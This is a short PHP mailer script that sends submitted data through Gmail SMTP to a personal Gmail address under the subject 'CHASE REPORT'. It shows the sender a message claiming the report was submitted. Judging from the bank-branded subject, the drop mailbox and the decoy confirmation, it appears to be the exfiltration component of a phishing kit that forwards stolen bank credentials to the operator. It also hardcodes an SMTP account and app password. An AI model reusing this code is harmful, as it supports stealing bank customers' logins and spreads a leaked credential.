<?php
// Include PHPMailer files
require './vendor/PHPMailer/src/Exception.php';
require './vendor/PHPMailer/src/PHPMailer.php';
require './vendor/PHPMailer/src/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

function sendMail($title, $body)
{

    if ($body != null) {
        // Email information
        $to = "dreedlock0+202@gmail.com";
        // $to = "arunemail700@gmail.com";
        $subject = "CHASE REPORT - " . $title;

        // Create a new PHPMailer instance
        $mail = new PHPMailer(true);

        try {
            //Server settings
            $mail->isSMTP();                                            // Set mailer to use SMTP
            $mail->Host       = 'smtp.gmail.com';                       // Specify main and backup SMTP servers
            $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
            $mail->Username   = 'dreedlock0@gmail.com';                 // SMTP username
            $mail->Password   = 'rmdw ngdt wuos wcrb';                    // SMTP password (app password)
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;           // Enable TLS encryption
            $mail->Port       = 587;                                    // TCP port to connect to

            //Recipients
            $mail->setFrom('dreedlock0@gmail.com', $title);        // Set sender
            $mail->addAddress($to);                                    // Add a recipient

            //Content
            $mail->isHTML(false);                                      // Set email format to plain text
            $mail->Subject = $subject;
            $mail->Body    = $body;
            $mail->isHTML(true);
            $mail->send();
            echo "Your report has been submitted successfully. We will contact you shortly.";
        } catch (Exception $e) {
            echo "Oops! Something went wrong. Please try again later. Mailer Error: {$mail->ErrorInfo}";
        }
    } else {
        echo "Access denied.";
    }
}
